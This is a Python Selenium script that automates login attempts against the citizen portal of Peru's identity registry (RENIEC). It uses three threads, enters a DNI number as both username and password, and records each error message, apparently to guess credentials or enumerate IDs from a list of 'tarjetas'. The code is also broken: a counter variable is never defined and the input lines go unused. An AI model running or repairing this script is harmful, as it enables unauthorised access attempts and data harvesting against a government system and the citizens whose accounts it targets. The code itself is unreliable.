from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
from selenium.common.exceptions import NoSuchElementException
from os import system
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import WebDriverException

from selenium.common.exceptions import ElementClickInterceptedException, TimeoutException, ElementNotInteractableException
import time, os, argparse, undetected_chromedriver as uc, requests, threading, random, base64, sys

from requests import get
from selenium.webdriver.firefox.options import Options
import telegram
from colorama import init,Fore,Back,Style
from concurrent.futures import ThreadPoolExecutor

pathBotonIngresar = '/html/body/div[1]/div/div/div[1]/div/div[1]/div[3]/div/div[1]/index1/div/div/div/div[3]/div/a'
path_ventanaError = '/html/body/div[2]/div/div/div[2]'
path_mensajeError= '/html/body/div[2]/div/div/div[2]/p'
pathCerrarbtn = '/html/body/div[2]/div/div/div[3]/button'

def func():
    global driver
    driver = webdriver.Firefox(executable_path = "geckodriver.exe")
    driver.get(url) 
    print(driver)

def accion():

    driver.find_element(By.ID,'nuDni').send_keys(num)
    driver.find_element(By.ID,'npass').send_keys(num)
    driver.find_element(By.XPATH,pathBotonIngresar).click()
    wait0 = WebDriverWait(driver,10)
    wait0.until(EC.visibility_of_element_located((By.XPATH,path_ventanaError))) #esperando ventana roja
    p = driver.find_element(By.XPATH,path_mensajeError).text
    #time.sleep(0.2)
    driver.find_element(By.XPATH,pathCerrarbtn).click()
    print(num," | ",p)
    #print("listoooooooooooooooo")
    #driver.close()
    num = num + 1


#-----------------------------------------------


if __name__ == '__main__':

    url = "https://cel.reniec.gob.pe/celweb/index.html"
    os.system("cls")
    global num
    def funcionUnida(tarjeta):
        func()
        accion()
                
    workers = 3
    print("Comen")
    with ThreadPoolExecutor(max_workers=3) as executor:
        with open("equis.txt","r") as tarjetas:
            for tarjeta in tarjetas.readlines():
                executor.submit(funcionUnida, tarjeta.strip())
                #executor.submit(funcionUnida, tarjeta.strip())
       

#with ThreadPoolExecutor(max_workers=int(workers)) as executor:
        #with open("tarjetas/" + path_tarjetas,"r") as tarjetas:
            #for tarjeta in tarjetas.readlines():
               # executor.submit(main, tarjeta.strip(), clave, key)